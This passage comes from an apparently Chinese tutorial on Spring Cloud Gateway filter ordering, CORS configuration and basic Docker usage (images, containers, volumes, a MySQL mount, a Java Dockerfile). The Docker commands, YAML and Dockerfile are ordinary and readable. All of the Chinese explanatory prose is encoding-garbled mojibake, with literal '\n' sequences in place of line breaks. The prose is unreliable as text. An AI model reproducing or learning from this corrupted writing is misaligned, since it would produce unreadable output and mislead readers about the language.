â¸è¿‡æ»¤å™¨æ‰§è¡Œé¡ºåº\n\nè¯·æ±‚è¿›å…¥ç½‘å…³ä¼šç¢°åˆ°ä¸‰ç±»è¿‡æ»¤å™¨ï¼šDefaultFilterã€å½“å‰è·¯ç”±çš„è¿‡æ»¤å™¨ã€GlobalFilter\n\nè¯·æ±‚è·¯ç”±åï¼Œä¼šå°†ä¸‰ä¸ªè¿‡æ»¤å™¨åˆå¹¶åˆ°ä¸€ä¸ªè¿‡æ»¤å™¨é“¾ï¼ˆé›†åˆï¼‰ä¸­ï¼Œæ’åºåä¾æ¬¡æ‰§è¡Œæ¯ä¸ªè¿‡æ»¤å™¨ï¼š\n\n![](https://img.jwt1399.top/img/202209251133009.png)\n\næ’åºçš„è§„åˆ™æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\n\n- æ¯ä¸€ä¸ªè¿‡æ»¤å™¨éƒ½å¿…é¡»æŒ‡å®šä¸€ä¸ªintç±»å‹çš„orderå€¼ï¼Œ**orderå€¼è¶Šå°ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼Œæ‰§è¡Œé¡ºåºè¶Šé å‰**ã€‚\n- GlobalFilteré€šè¿‡å®ç°Orderedæ¥å£ï¼Œæˆ–è€…æ·»åŠ @Orderæ³¨è§£æ¥æŒ‡å®šorderå€¼ï¼Œç”±æˆ‘ä»¬è‡ªå·±æŒ‡å®š\n- è·¯ç”±è¿‡æ»¤å™¨å’ŒdefaultFilterçš„orderç”±SpringæŒ‡å®šï¼Œé»˜è®¤æ˜¯æŒ‰ç…§å£°æ˜é¡ºåºä»1é€’å¢ã€‚\n- å½“è¿‡æ»¤å™¨çš„orderå€¼ä¸€æ ·æ—¶ï¼Œä¼šæŒ‰ç…§ defaultFilter > è·¯ç”±è¿‡æ»¤å™¨ > GlobalFilterçš„é¡ºåºæ‰§è¡Œã€‚\n\nè¯¦ç»†å†…å®¹ï¼Œå¯ä»¥æŸ¥çœ‹æºç ï¼š\n\n`org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#getFilters()`æ–¹æ³•æ˜¯å…ˆåŠ è½½defaultFiltersï¼Œç„¶åå†åŠ è½½æŸä¸ªrouteçš„filtersï¼Œç„¶ååˆå¹¶ã€‚\n\n`org.springframework.cloud.gateway.handler.FilteringWebHandler#handle()`æ–¹æ³•ä¼šåŠ è½½å…¨å±€è¿‡æ»¤å™¨ï¼Œä¸å‰é¢çš„è¿‡æ»¤å™¨åˆå¹¶åæ ¹æ®orderæ’åºï¼Œç»„ç»‡è¿‡æ»¤å™¨é“¾\n\n### â¹æ€»ç»“\n\nå…¨å±€è¿‡æ»¤å™¨çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- å¯¹æ‰€æœ‰è·¯ç”±éƒ½ç”Ÿæ•ˆçš„è¿‡æ»¤å™¨ï¼Œå¹¶ä¸”å¯ä»¥è‡ªå®šä¹‰å¤„ç†é€»è¾‘\n\nå®ç°å…¨å±€è¿‡æ»¤å™¨çš„æ­¥éª¤ï¼Ÿ\n\n- â‘ å®ç°GlobalFilteræ¥å£\n\n- â‘¡æ·»åŠ @Orderæ³¨è§£æˆ–å®ç°Orderedæ¥å£\n\n- â‘¢ç¼–å†™å¤„ç†é€»è¾‘\n\nè·¯ç”±è¿‡æ»¤å™¨ã€defaultFilterã€å…¨å±€è¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåºï¼Ÿ\n\n- â‘ orderå€¼è¶Šå°ï¼Œä¼˜å…ˆçº§è¶Šé«˜\n\n- â‘¡å½“orderå€¼ä¸€æ ·æ—¶ï¼Œé¡ºåºæ˜¯defaultFilter > å±€éƒ¨çš„è·¯ç”±è¿‡æ»¤å™¨ > å…¨å±€è¿‡æ»¤å™¨\n\n## â‘¥è·¨åŸŸé—®é¢˜\n\n### â¶ä»€ä¹ˆæ˜¯è·¨åŸŸé—®é¢˜\n\nè·¨åŸŸï¼šåŸŸåä¸ä¸€è‡´å°±æ˜¯è·¨åŸŸï¼Œä¸»è¦åŒ…æ‹¬ï¼š\n\n- åŸŸåä¸åŒï¼š `www.taobao.com` å’Œ `www.taobao.org` \n\n- åŸŸåç›¸åŒï¼Œç«¯å£ä¸åŒï¼š`localhost:8080` å’Œ `localhost8081`\n\nè·¨åŸŸé—®é¢˜ï¼šæµè§ˆå™¨ç¦æ­¢è¯·æ±‚çš„å‘èµ·è€…ä¸æœåŠ¡ç«¯å‘ç”Ÿè·¨åŸŸajaxè¯·æ±‚ï¼Œè¯·æ±‚è¢«æµè§ˆå™¨æ‹¦æˆªçš„é—®é¢˜\n\nè§£å†³æ–¹æ¡ˆï¼šCORSã€‚ä¸çŸ¥é“çš„å°ä¼™ä¼´å¯ä»¥æŸ¥çœ‹https://www.ruanyifeng.com/blog/2016/04/cors.html\n\n### â·æ¨¡æ‹Ÿè·¨åŸŸé—®é¢˜\n\nç¼–å†™ä¸€ä¸ªé¡µé¢ï¼Œå¹¶åœ¨VScodeä¸­å¯åŠ¨ `live-server --port=8090`\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n</head>\n<body>\n<pre>è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•ï¼</pre>\n</body>\n<script src=\"https://unpkg.com/axios/dist/axios.min.js\"></script>\n<script>\n  axios.get(\"http://localhost:10010/user/1?authorization=admin\")\n  .then(resp => console.log(resp.data))\n  .catch(err => console.log(err))\n</script>\n</html>\n```\n\nå¯ä»¥åœ¨æµè§ˆå™¨æ§åˆ¶å°çœ‹åˆ°ä¸‹é¢çš„é”™è¯¯ï¼š\n\n![](https://img.jwt1399.top/img/202209251219308.png)\n\nä»`localhost:8090`è®¿é—®`localhost:10010`ï¼Œç«¯å£ä¸åŒï¼Œæ˜¾ç„¶æ˜¯è·¨åŸŸçš„è¯·æ±‚ã€‚\n\n### â¸è§£å†³è·¨åŸŸé—®é¢˜\n\nåœ¨gatewayæœåŠ¡çš„application.ymlæ–‡ä»¶ä¸­ï¼Œæ·»åŠ ä¸‹é¢çš„é…ç½®ï¼š\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      # .......\n      globalcors: # å…¨å±€çš„è·¨åŸŸå¤„ç†\n        add-to-simple-url-handler-mapping: true # è§£å†³optionsè¯·æ±‚è¢«æ‹¦æˆªé—®é¢˜\n        corsConfigurations:\n          '[/**]': # æ‹¦æˆªä¸€åˆ‡è¯·æ±‚\n            allowedOrigins: # å…è®¸å“ªäº›ç½‘ç«™çš„è·¨åŸŸè¯·æ±‚ \n              - \"http://localhost:8090\"\n              - \"https://jwt1399.top\"\n            allowedMethods: # å…è®¸çš„è·¨åŸŸajaxçš„è¯·æ±‚æ–¹å¼\n              - \"GET\"\n              - \"POST\"\n              - \"DELETE\"\n              - \"PUT\"\n              - \"OPTIONS\"\n            allowedHeaders: \"*\" # å…è®¸åœ¨è¯·æ±‚ä¸­æºå¸¦çš„å¤´ä¿¡æ¯\n            allowCredentials: true # æ˜¯å¦å…è®¸æºå¸¦cookie\n            maxAge: 360000 # è¿™æ¬¡è·¨åŸŸæ£€æµ‹çš„æœ‰æ•ˆæœŸ\n```\n\n# 8.DockeræŠ€æœ¯\n\n**é•œåƒï¼ˆImageï¼‰**ï¼šå°†åº”ç”¨ç¨‹åºåŠå…¶æ‰€éœ€çš„ä¾èµ–ã€å‡½æ•°åº“ã€ç¯å¢ƒã€é…ç½®ç­‰æ–‡ä»¶æ‰“åŒ…åœ¨ä¸€èµ·ï¼Œç§°ä¸ºé•œåƒ\n\n**å®¹å™¨ï¼ˆContainerï¼‰**ï¼šé•œåƒä¸­çš„åº”ç”¨ç¨‹åºè¿è¡Œåå½¢æˆçš„è¿›ç¨‹å°±æ˜¯å®¹å™¨\n\n**ä»“åº“ï¼ˆRepositoryï¼‰**ï¼šä¸€ä¸ªé•œåƒæ‰˜ç®¡çš„æœåŠ¡å™¨ï¼Œå¯ä»¥ä»ä¸­ä¸Šä¼ ã€æ‹‰å–é•œåƒã€‚\n\n**æ•°æ®å·ï¼ˆvolumeï¼‰**ï¼šæ˜¯ä¸€ä¸ªè™šæ‹Ÿç›®å½•ï¼ŒæŒ‡å‘å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¸­çš„æŸä¸ªç›®å½•ã€‚\n\n## â‘ é•œåƒæ“ä½œ\n\n### â¶é•œåƒåç§°\n\n- é•œåç§°ä¸€èˆ¬åˆ†ä¸¤éƒ¨åˆ†ç»„æˆï¼š[repository]:[tag]ã€‚\n- åœ¨æ²¡æœ‰æŒ‡å®štagæ—¶ï¼Œé»˜è®¤æ˜¯latestï¼Œä»£è¡¨æœ€æ–°ç‰ˆæœ¬çš„é•œåƒ\n\n### â·é•œåƒå‘½ä»¤\n\n![](https://img.jwt1399.top/img/202210031952952.png)\n\n```bash\ndocker images  # æŸ¥çœ‹é•œåƒ\ndocker inspect # æŸ¥çœ‹å…·ä½“é•œåƒ\ndocker rmi\t\t # åˆ é™¤é•œåƒ\ndocker pull    # æ‹‰å–é•œåƒ\ndocker push    # æ¨é€é•œåƒ\ndocker save    # å¯¼å‡ºé•œåƒ\ndocker load    # åŠ è½½é•œåƒ\n```\n\n### â¸é•œåƒæ¡ˆä¾‹\n\n> éœ€æ±‚ï¼šä»DockerHubä¸­æ‹‰å–ä¸€ä¸ªnginxé•œåƒå¹¶æŸ¥çœ‹\n\n```bash\n# 1ï¼‰é¦–å…ˆå»é•œåƒä»“åº“æœç´¢nginxé•œåƒï¼Œæ¯”å¦‚DockerHub\n# 2ï¼‰æ ¹æ®æŸ¥çœ‹åˆ°çš„é•œåƒåç§°ï¼Œæ‹‰å–è‡ªå·±éœ€è¦çš„é•œåƒ\ndocker pull nginx\n# 3ï¼‰æŸ¥çœ‹æ‹‰å–åˆ°çš„é•œåƒ\ndocker images \n```\n\n> éœ€æ±‚ï¼šåˆ©ç”¨docker saveå°†nginxé•œåƒå¯¼å‡ºç£ç›˜ï¼Œç„¶åå†é€šè¿‡loadåŠ è½½å›æ¥\n\n```bash\n# 1ï¼‰åˆ©ç”¨docker xx --helpå‘½ä»¤æŸ¥çœ‹è¯­æ³•ï¼Œä¾‹å¦‚ï¼ŒæŸ¥çœ‹saveå‘½ä»¤ç”¨æ³•ï¼Œå¯ä»¥è¾“å…¥å‘½ä»¤ï¼š\ndocker save --help\n# 2ï¼‰ä½¿ç”¨docker saveå¯¼å‡ºé•œåƒåˆ°ç£ç›˜ \ndocker save -o nginx.tar nginx:latest\n# 3ï¼‰ä½¿ç”¨docker loadåŠ è½½é•œåƒ\n# å…ˆåˆ é™¤æœ¬åœ°çš„nginxé•œåƒï¼š\ndocker rmi nginx:latest\n# ç„¶åè¿è¡Œå‘½ä»¤ï¼ŒåŠ è½½æœ¬åœ°æ–‡ä»¶\ndocker load -i nginx.tar\n```\n\n## â‘¡å®¹å™¨æ“ä½œ\n\n### â¶å®¹å™¨çŠ¶æ€\n\nå®¹å™¨ä¿æŠ¤ä¸‰ä¸ªçŠ¶æ€ï¼š\n\n- è¿è¡Œï¼šè¿›ç¨‹æ­£å¸¸è¿è¡Œ\n- æš‚åœï¼šè¿›ç¨‹æš‚åœï¼ŒCPUä¸å†è¿è¡Œï¼Œå¹¶ä¸é‡Šæ”¾å†…å­˜\n- åœæ­¢ï¼šè¿›ç¨‹ç»ˆæ­¢ï¼Œå›æ”¶è¿›ç¨‹å ç”¨çš„å†…å­˜ã€CPUç­‰èµ„æº\n\n### â·å®¹å™¨å‘½ä»¤\n\n![](https://img.jwt1399.top/img/202210032001294.png)\n\n```bash\ndocker ps       # æŸ¥çœ‹å®¹å™¨çŠ¶æ€, -a æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ŒåŒ…æ‹¬å·²ç»åœæ­¢çš„\ndocker run      # åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼Œå¤„äºè¿è¡ŒçŠ¶æ€\ndocker pause    # è®©ä¸€ä¸ªè¿è¡Œçš„å®¹å™¨æš‚åœ\ndocker unpause  # è®©ä¸€ä¸ªå®¹å™¨ä»æš‚åœçŠ¶æ€æ¢å¤è¿è¡Œ\ndocker stop     # åœæ­¢ä¸€ä¸ªè¿è¡Œçš„å®¹å™¨\ndocker start    # è®©ä¸€ä¸ªåœæ­¢çš„å®¹å™¨å†æ¬¡è¿è¡Œ\ndocker rm       # åˆ é™¤ä¸€ä¸ªå®¹å™¨\ndocker exec     # è¿›å…¥å®¹å™¨æ‰§è¡Œå‘½ä»¤\ndocker logs     # æŸ¥çœ‹å®¹å™¨æ—¥å¿—çš„å‘½ä»¤,-f å‚æ•°å¯ä»¥æŒç»­æŸ¥çœ‹æ—¥å¿—\n```\n\n### â¸å®¹å™¨æ¡ˆä¾‹\n\n> **éœ€æ±‚**ï¼šåˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªnginxå®¹å™¨\n\n```bash\ndocker run --name mn -p 80:80 -d nginx\n```\n\nå‘½ä»¤è§£è¯»ï¼š\n\n- docker run ï¼šåˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªå®¹å™¨\n- --name : ç»™å®¹å™¨èµ·ä¸€ä¸ªåå­—ï¼Œæ¯”å¦‚å«åšmn\n- -p ï¼šå°†å®¿ä¸»æœºç«¯å£ä¸å®¹å™¨ç«¯å£æ˜ å°„ï¼Œå†’å·å·¦ä¾§æ˜¯å®¿ä¸»æœºç«¯å£ï¼Œå³ä¾§æ˜¯å®¹å™¨ç«¯å£\n- -dï¼šåå°è¿è¡Œå®¹å™¨\n- nginxï¼šé•œåƒåç§°ï¼Œä¾‹å¦‚nginx\n\n> **éœ€æ±‚**ï¼šè¿›å…¥Nginxå®¹å™¨ï¼Œä¿®æ”¹HTMLæ–‡ä»¶å†…å®¹ï¼Œæ·»åŠ \"å“ˆå–½ï¼Œä½ å¥½å‘€ï¼\"\n\n1ï¼‰è¿›å…¥å®¹å™¨ã€‚è¿›å…¥æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„nginxå®¹å™¨çš„å‘½ä»¤ä¸ºï¼š\n\n```sh\ndocker exec -it mn bash\n```\n\nå‘½ä»¤è§£è¯»ï¼š\n\n- docker exec ï¼šè¿›å…¥å®¹å™¨å†…éƒ¨ï¼Œæ‰§è¡Œä¸€ä¸ªå‘½ä»¤\n\n- -it : ç»™å½“å‰è¿›å…¥çš„å®¹å™¨åˆ›å»ºä¸€ä¸ªæ ‡å‡†è¾“å…¥ã€è¾“å‡ºç»ˆç«¯ï¼Œå…è®¸æˆ‘ä»¬ä¸å®¹å™¨äº¤äº’\n\n- mn ï¼šè¦è¿›å…¥çš„å®¹å™¨çš„åç§°\n\n- bashï¼šè¿›å…¥å®¹å™¨åæ‰§è¡Œçš„å‘½ä»¤ï¼Œbashæ˜¯ä¸€ä¸ªlinuxç»ˆç«¯äº¤äº’å‘½ä»¤\n\n2ï¼‰è¿›å…¥nginxçš„HTMLæ‰€åœ¨ç›®å½•\n\næŸ¥çœ‹DockerHubç½‘ç«™ä¸­çš„nginxé¡µé¢ï¼Œå¯ä»¥çŸ¥é“nginxçš„htmlç›®å½•ä½ç½®åœ¨`/usr/share/nginx/html`\n\n```bash\ncd /usr/share/nginx/html\n```\n\n3ï¼‰ä¿®æ”¹index.htmlçš„å†…å®¹\n\nå®¹å™¨å†…æ²¡æœ‰viå‘½ä»¤ï¼Œæ— æ³•ç›´æ¥ä¿®æ”¹ï¼Œæˆ‘ä»¬ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥ä¿®æ”¹ï¼š\n\n```sh\nsed -i -e 's#Welcome to nginx#å“ˆå–½ï¼Œä½ å¥½å‘€ï¼#g' -e 's#<head>#<head><meta charset=\"utf-8\">#g' index.html\n```\n\nåœ¨æµè§ˆå™¨è®¿é—® `127.0.0.1:80` ï¼Œå³å¯çœ‹åˆ°ç»“æœ\n\n## â‘¢æ•°æ®å·\n\n### â¶ç®€ä»‹\n\n**æ•°æ®å·ï¼ˆvolumeï¼‰**æ˜¯ä¸€ä¸ªè™šæ‹Ÿç›®å½•ï¼ŒæŒ‡å‘å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¸­çš„æŸä¸ªç›®å½•ã€‚\n\næ•°æ®å·çš„ä½œç”¨ï¼šå°†å®¹å™¨ä¸æ•°æ®åˆ†ç¦»ï¼Œè§£è€¦åˆï¼Œæ–¹ä¾¿æ“ä½œå®¹å™¨å†…æ•°æ®ï¼Œä¿è¯æ•°æ®å®‰å…¨\n\n![](https://img.jwt1399.top/img/202210032028213.png)\n\nä¸€æ—¦å®Œæˆæ•°æ®å·æŒ‚è½½ï¼Œå¯¹å®¹å™¨çš„ä¸€åˆ‡æ“ä½œéƒ½ä¼šä½œç”¨åœ¨æ•°æ®å·å¯¹åº”çš„å®¿ä¸»æœºç›®å½•äº†ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬æ“ä½œå®¿ä¸»æœºçš„/var/lib/docker/volumes/htmlç›®å½•ï¼Œå°±ç­‰äºæ“ä½œå®¹å™¨å†…çš„/usr/share/nginx/htmlç›®å½•äº†\n\n### â·æ•°æ®é›†å‘½ä»¤\n\n```sh\ndocker volume create     # åˆ›å»ºä¸€ä¸ªæ•°æ®å·\ndocker volume ls         # åˆ—å‡ºæ‰€æœ‰çš„volume\ndocker volume inspect    # æ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªvolumeçš„ä¿¡æ¯\ndocker volume rm         # åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡å®šçš„volume\ndocker volume prune      # åˆ é™¤æœªä½¿ç”¨çš„volume\n```\n\n### â¸åˆ›å»ºå’ŒæŸ¥çœ‹æ•°æ®å·\n\n**éœ€æ±‚**ï¼šåˆ›å»ºä¸€ä¸ªæ•°æ®å·ï¼Œå¹¶æŸ¥çœ‹æ•°æ®å·åœ¨å®¿ä¸»æœºçš„ç›®å½•ä½ç½®\n\nâ‘  åˆ›å»ºæ•°æ®å·\n\n```sh\ndocker volume create html\n```\n\nâ‘¡ æŸ¥çœ‹æ‰€æœ‰æ•°æ®\n\n```sh\ndocker volume ls\n```\n\nâ‘¢ æŸ¥çœ‹æ•°æ®å·è¯¦ç»†ä¿¡æ¯å·\n\n```sh\ndocker volume inspect html\n```\n\n![](https://img.jwt1399.top/img/202210032037488.png)\n\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åˆ›å»ºçš„htmlè¿™ä¸ªæ•°æ®å·å…³è”çš„å®¿ä¸»æœºç›®å½•ä¸º`/var/lib/docker/volumes/html/_data`ç›®å½•ã€‚\n\n### â¹æŒ‚è½½æ•°æ®å·\n\næˆ‘ä»¬åœ¨åˆ›å»ºå®¹å™¨æ—¶ï¼Œå¯ä»¥é€šè¿‡ -v å‚æ•°æ¥æŒ‚è½½ä¸€ä¸ªæ•°æ®å·åˆ°æŸä¸ªå®¹å™¨å†…ç›®å½•ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š\n\n```sh\ndocker run \\\n  --name mn \\\n  -v html:/root/html \\\n  -p 8080:80\n  nginx \\\n```\n\nè¿™é‡Œçš„-vå°±æ˜¯æŒ‚è½½æ•°æ®å·çš„å‘½ä»¤ï¼š\n\n- `-v html:/root/html` ï¼šæŠŠhtmlæ•°æ®å·æŒ‚è½½åˆ°å®¹å™¨å†…çš„/root/htmlè¿™ä¸ªç›®å½•ä¸­\n\n### âºæ¡ˆä¾‹:ç»™NginxæŒ‚è½½æ•°æ®å·\n\n> **éœ€æ±‚**ï¼šåˆ›å»ºä¸€ä¸ªnginxå®¹å™¨ï¼Œä¿®æ”¹å®¹å™¨å†…çš„htmlç›®å½•å†…çš„index.htmlå†…å®¹\n\nâ‘  åˆ›å»ºå®¹å™¨å¹¶æŒ‚è½½æ•°æ®å·åˆ°å®¹å™¨å†…çš„HTMLç›®å½•\n\n```sh\ndocker run --name mn -v html:/usr/share/nginx/html -p 80:80 -d nginx\n```\n\nâ‘¡ è¿›å…¥htmlæ•°æ®å·æ‰€åœ¨ä½ç½®ï¼Œå¹¶ä¿®æ”¹HTMLå†…å®¹\n\n```sh\n# æŸ¥çœ‹htmlæ•°æ®å·çš„ä½ç½®\ndocker volume inspect html\n# è¿›å…¥è¯¥ç›®å½•\ncd /var/lib/docker/volumes/html/_data\n# ä¿®æ”¹æ–‡ä»¶\nvi index.html\n```\n\næ³¨ï¼šmacä¸‹ docker å®é™…æ˜¯åœ¨vmé‡ŒåˆåŠ äº†ä¸€å±‚ï¼Œå› æ­¤éœ€è¦è¿›å…¥ vm æ‰èƒ½æ‰§è¡Œä¸Šé¢æ“ä½œ\n\n```bash\ndocker run -it --privileged --pid=host justincormack/nsenter1\n```\n\n### â»æ¡ˆä¾‹-ç»™MySQLæŒ‚è½½æœ¬åœ°ç›®å½•\n\nå®¹å™¨ä¸ä»…ä»…å¯ä»¥æŒ‚è½½æ•°æ®å·ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŒ‚è½½åˆ°å®¿ä¸»æœºç›®å½•ä¸Šã€‚å…³è”å…³ç³»å¦‚ä¸‹ï¼š\n\n- å¸¦æ•°æ®å·æ¨¡å¼ï¼šå®¿ä¸»æœºç›®å½• --> æ•°æ®å· ---> å®¹å™¨å†…ç›®å½•\n- ç›´æ¥æŒ‚è½½æ¨¡å¼ï¼šå®¿ä¸»æœºç›®å½• ---> å®¹å™¨å†…ç›®å½•\n\n![](https://img.jwt1399.top/img/202210032118037.png)\n\n**è¯­æ³•**ï¼šç›®å½•æŒ‚è½½ä¸æ•°æ®å·æŒ‚è½½çš„è¯­æ³•æ˜¯ç±»ä¼¼çš„ï¼š\n\n- -v [å®¿ä¸»æœºç›®å½•]:[å®¹å™¨å†…ç›®å½•]\n- -v [å®¿ä¸»æœºæ–‡ä»¶]:[å®¹å™¨å†…æ–‡ä»¶]\n\n> **éœ€æ±‚**ï¼šåˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªMySQLå®¹å™¨ï¼Œå°†å®¿ä¸»æœºç›®å½•ç›´æ¥æŒ‚è½½åˆ°å®¹å™¨\n\n1ï¼‰æ‹‰å–mysqlé•œåƒ\n\n```bash\ndocker pull mysql\n```\n\n2ï¼‰åˆ›å»ºç›®å½•/tmp/mysql/data\n\n```bash\nmkdir -p /tmp/mysql/data\n```\n\n3ï¼‰åˆ›å»ºç›®å½•/tmp/mysql/confï¼Œå°†æä¾›çš„hmy.cnfæ–‡ä»¶ä¸Šä¼ åˆ°/tmp/mysql/conf\n\n```bash\nmkdir -p /tmp/mysql/conf\n```\n\n4ï¼‰å»DockerHubæŸ¥é˜…èµ„æ–™ï¼Œåˆ›å»ºå¹¶è¿è¡ŒMySQLå®¹å™¨ï¼Œè¦æ±‚ï¼š\n\nâ‘  æŒ‚è½½/tmp/mysql/dataåˆ°mysqlå®¹å™¨å†…æ•°æ®å­˜å‚¨ç›®å½•\n\nâ‘¡ æŒ‚è½½/tmp/mysql/conf/hmy.cnfåˆ°mysqlå®¹å™¨çš„é…ç½®æ–‡ä»¶\n\nâ‘¢ è®¾ç½®MySQLå¯†ç \n\n```bash\ndocker run \\\n --name some-mysql \\\n -e MYSQL_ROOT_PASSWORD=root \\\n -p 3306:3306 \\\n -v /tmp/mysql/data:/var/lib/mysql \\\n -v /tmp/mysql/conf/hmy.cnf:/etc/mysql/conf.d/hmy.cnf \\\n -d mysql:latest \n```\n\næ•°æ®å·æŒ‚è½½ä¸ç›®å½•ç›´æ¥æŒ‚è½½çš„åŒºåˆ«\n\n- æ•°æ®å·æŒ‚è½½è€¦åˆåº¦ä½ï¼Œç”±dockeræ¥ç®¡ç†ç›®å½•ï¼Œä½†æ˜¯ç›®å½•è¾ƒæ·±ï¼Œä¸å¥½æ‰¾\n- ç›®å½•æŒ‚è½½è€¦åˆåº¦é«˜ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±ç®¡ç†ç›®å½•ï¼Œä¸è¿‡ç›®å½•å®¹æ˜“å¯»æ‰¾æŸ¥çœ‹\n\n## â‘£Dockerfile\n\nå¸¸è§çš„é•œåƒåœ¨DockerHubå°±èƒ½æ‰¾åˆ°ï¼Œä½†æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„é¡¹ç›®å°±å¿…é¡»è‡ªå·±æ„å»ºé•œåƒäº†ã€‚\n\n### â¶é•œåƒç»“æ„\n\nè¦è‡ªå®šä¹‰é•œåƒï¼Œå°±å¿…é¡»å…ˆäº†è§£é•œåƒçš„ç»“æ„æ‰è¡Œã€‚é•œåƒæ˜¯å°†åº”ç”¨ç¨‹åºåŠå…¶éœ€è¦çš„ç³»ç»Ÿå‡½æ•°åº“ã€ç¯å¢ƒã€é…ç½®ã€ä¾èµ–æ‰“åŒ…è€Œæˆã€‚\n\næˆ‘ä»¬ä»¥MySQLä¸ºä¾‹ï¼Œæ¥çœ‹çœ‹é•œåƒçš„ç»„æˆç»“æ„ï¼š\n\n![](https://img.jwt1399.top/img/202210041351237.png)\n\nç®€å•æ¥è¯´ï¼Œé•œåƒå°±æ˜¯åœ¨ç³»ç»Ÿå‡½æ•°åº“ã€è¿è¡Œç¯å¢ƒåŸºç¡€ä¸Šï¼Œæ·»åŠ åº”ç”¨ç¨‹åºæ–‡ä»¶ã€é…ç½®æ–‡ä»¶ã€ä¾èµ–æ–‡ä»¶ç­‰ç»„åˆï¼Œç„¶åç¼–å†™å¥½å¯åŠ¨è„šæœ¬æ‰“åŒ…åœ¨ä¸€èµ·å½¢æˆçš„æ–‡ä»¶ã€‚\n\nå› æ­¤æˆ‘ä»¬åªéœ€è¦å‘Šè¯‰Dockerï¼Œæˆ‘ä»¬çš„é•œåƒçš„ç»„æˆï¼Œéœ€è¦å“ªäº›BaseImageã€éœ€è¦æ‹·è´ä»€ä¹ˆæ–‡ä»¶ã€éœ€è¦å®‰è£…ä»€ä¹ˆä¾èµ–ã€å¯åŠ¨è„šæœ¬æ˜¯ä»€ä¹ˆï¼Œå°†æ¥Dockerä¼šå¸®åŠ©æˆ‘ä»¬æ„å»ºé•œåƒã€‚è€Œæè¿°è¿™äº›ä¿¡æ¯çš„æ–‡ä»¶å°±æ˜¯Dockerfileæ–‡ä»¶ã€‚\n\n### â·è¯­æ³•\n\n**Dockerfile**å°±æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªä¸ªçš„**æŒ‡ä»¤(Instruction)**ï¼Œç”¨æŒ‡ä»¤æ¥è¯´æ˜è¦æ‰§è¡Œä»€ä¹ˆæ“ä½œæ¥æ„å»ºé•œåƒã€‚æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå½¢æˆä¸€å±‚Layerã€‚\n\n![](../images/SpringCloud-å®ç”¨ç¯‡/image-20221004135210763.png)\n\næ›´æ–°è¯¦ç»†è¯­æ³•è¯´æ˜ï¼Œè¯·å‚è€ƒå®˜ç½‘æ–‡æ¡£ï¼š https://docs.docker.com/engine/reference/builder\n\n### â¸æ¡ˆä¾‹\n\n#### â“µåŸºäºUbuntuæ„å»ºJavaé¡¹ç›®\n\n> éœ€æ±‚ï¼šåŸºäºUbuntué•œåƒæ„å»ºä¸€ä¸ªæ–°é•œåƒï¼Œè¿è¡Œä¸€ä¸ªjavaé¡¹ç›®\n\næ­¥éª¤1ï¼šæ–°å»ºä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ docker-demo\n\næ­¥éª¤2ï¼šæ‹·è´ docker-demo.jar æ–‡ä»¶åˆ° docker-demo ç›®å½•\n\næ­¥éª¤3ï¼šæ‹·è´ jdk8.tar.gz æ–‡ä»¶åˆ° docker-demo ç›®å½•\n\næ­¥éª¤4ï¼šåœ¨ docker-demo ç›®å½•ä¸‹æ–°å»º Dockerfileï¼Œå†…å®¹å¦‚ä¸‹\n\n```bash\n# æŒ‡å®šåŸºç¡€é•œåƒ\nFROM ubuntu:16.04\n# é…ç½®ç¯å¢ƒå˜é‡ï¼ŒJDKçš„å®‰è£…ç›®å½•\nENV JAVA_DIR=/usr/local\n\n# æ‹·è´jdkå’Œjavaé¡¹ç›®çš„åŒ…\nCOPY ./jdk8.tar.gz $JAVA_DIR/\nCOPY ./docker-demo.jar /tmp/app.jar\n\n# å®‰è£…JDK\nRUN cd $JAVA_DIR \\\n && tar -xf ./jdk8.tar.gz \\\n && mv ./jdk1.8.0_144 ./java8\n\n# é…ç½®ç¯å¢ƒå˜é‡\nENV JAVA_HOME=$JAVA_DIR/java8\nENV PATH=$PATH:$JAVA_HOME/bin\n\n# æš´éœ²ç«¯å£\nEXPOSE 8090\n# å…¥å£ï¼Œjavaé¡¹ç›®çš„å¯åŠ¨å‘½ä»¤\nENTRYPOINT java -jar /tmp/app.jar\n```\n\næ­¥éª¤5ï¼šè¿›å…¥ docker-demoï¼Œè¿è¡Œå‘½ä»¤\n\n```bash\ndocker build -t javaweb:1.0 .\n\n# -tä»£è¡¨tagå³åå­—\n# .ä»£è¡¨Dockerfileæ‰€åœ¨çš„ç›®å½•\n```\n\næ­¥éª¤6ï¼šä½¿ç”¨docker runåˆ›å»ºå®¹å™¨å¹¶è¿è¡Œ\n\n```bash\ndocker run --name web -p 8090:8090 -d javaweb:1.0 \n```\n\næœ€åè®¿é—® http://127.0.0.1:8090/hello/count\n\n#### 